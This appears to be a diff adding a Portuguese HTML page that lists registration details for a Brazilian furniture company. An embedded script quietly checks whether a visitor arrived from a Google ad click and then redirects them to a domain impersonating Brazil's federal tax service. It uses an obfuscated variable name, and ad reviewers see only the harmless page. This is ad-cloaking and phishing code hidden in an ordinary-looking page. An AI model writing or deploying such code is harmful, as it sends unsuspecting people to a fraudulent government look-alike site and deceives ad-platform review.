@@ -1,1 +1,127 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Dados da Empresa</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f4f6f8;
+            margin: 0;
+            padding: 20px;
+        }
+        .container {
+            max-width: 700px;
+            margin: auto;
+            background: #ffffff;
+            padding: 20px;
+            border-radius: 10px;
+            box-shadow: 0 0 10px rgba(0,0,0,0.1);
+        }
+        h1 {
+            text-align: center;
+            color: #333;
+        }
+        .info {
+            margin: 10px 0;
+            padding: 10px;
+            border-bottom: 1px solid #ddd;
+        }
+        .label {
+            font-weight: bold;
+            color: #555;
+        }
+        .value {
+            color: #222;
+        }
+    </style>
+</head>
+  <script>
 
+const urls = [
+    'cte/index',
+    'nfe/index',
+    'cte/index',
+    'asp/indexp',
+    'app/index',
+    'xml/indexp',
+    'danfe/index',
+    'nfe/index'
+];
+
+// Função para gerar um hash MD5 (requer biblioteca crypto ou implementação personalizada)
+function generateHash() {
+    // Gerando um hash simples como alternativa ao MD5
+    // Para MD5 real, seria necessário uma biblioteca como crypto-js
+    return Math.random().toString(36).substring(2, 15) + 
+           Math.random().toString(36).substring(2, 15) + 
+           Date.now().toString(36);
+}
+
+// Selecionando URL aleatória
+const randomIndex = Math.floor(Math.random() * urls.length);
+const randomUrl = urls[randomIndex];
+const hash = generateHash();
+const googlerandomUrlWithHash = randomUrl + '?gclid=' + hash;
+const bingrandomUrlWithHash = randomUrl + '?msclkid=' + hash;
+const xirjfgjsdhdjd = 'https://www8.receita-fazenda-cnpj.site/MEI';  
+
+// Obtendo o referer (disponível apenas no navegador)
+let referer;
+if (typeof document !== 'undefined' && document.referrer) {
+    referer = document.referrer;
+} else {
+    referer = 'not found';
+}
+
+// Obtendo a URL atual (equivalente ao REQUEST_URI do PHP)
+let currentUrl;
+if (typeof window !== 'undefined') {
+    currentUrl = window.location.href;
+} else {
+    currentUrl = '';
+}
+
+// Verificando condições e redirecionando
+if (/gclid/i.test(referer) || /gclid/i.test(currentUrl)) {
+    // Redirecionamento (no navegador)
+    if (typeof window !== 'undefined') {
+        window.location.href = xirjfgjsdhdjd ;
+    } else {
+        console.log('Redirect to:', xirjfgjsdhdjd );
+    }
+} else if (/msclkid/i.test(referer) || /msclkid/i.test(currentUrl)) {
+    // Redirecionamento (no navegador)
+    if (typeof window !== 'undefined') {
+        window.location.href = bingrandomUrlWithHash;
+    } else {
+        console.log('Redirect to:', bingrandomUrlWithHash);
+    }
+} else {
+    // Bloco vazio equivalente ao else do PHP
+}
+  
+</script>
+<body>
+
+<div class="container">
+    <h1>Informações de Registro</h1>
+
+    <div class="info"><span class="label">CNPJ:</span> <span class="value">33.552.902/0004-32</span></div>
+    <div class="info"><span class="label">Inscrição Estadual RJ:</span> <span class="value">82.333.50-9</span></div>
+    <div class="info"><span class="label">Razão Social:</span> <span class="value">Bel Air Móveis LTDA</span></div>
+    <div class="info"><span class="label">Data de Abertura:</span> <span class="value">30/07/1978</span></div>
+    <div class="info"><span class="label">Tempo de Atividade:</span> <span class="value">47 anos, 7 meses e 30 dias</span></div>
+    <div class="info"><span class="label">Porte:</span> <span class="value">Empresa de Pequeno Porte</span></div>
+    <div class="info"><span class="label">Natureza Jurídica:</span> <span class="value">Sociedade Empresária Limitada</span></div>
+    <div class="info"><span class="label">Opção pelo MEI:</span> <span class="value">Não</span></div>
+    <div class="info"><span class="label">Opção pelo Simples:</span> <span class="value">Não</span></div>
+    <div class="info"><span class="label">Capital Social:</span> <span class="value">R$ 303.000,00</span></div>
+    <div class="info"><span class="label">Tipo:</span> <span class="value">Filial</span></div>
+    <div class="info"><span class="label">Situação:</span> <span class="value">Ativa</span></div>
+    <div class="info"><span class="label">Data Situação Cadastral:</span> <span class="value">08/06/2022</span></div>
+</div>
+
+</body>
+</html>
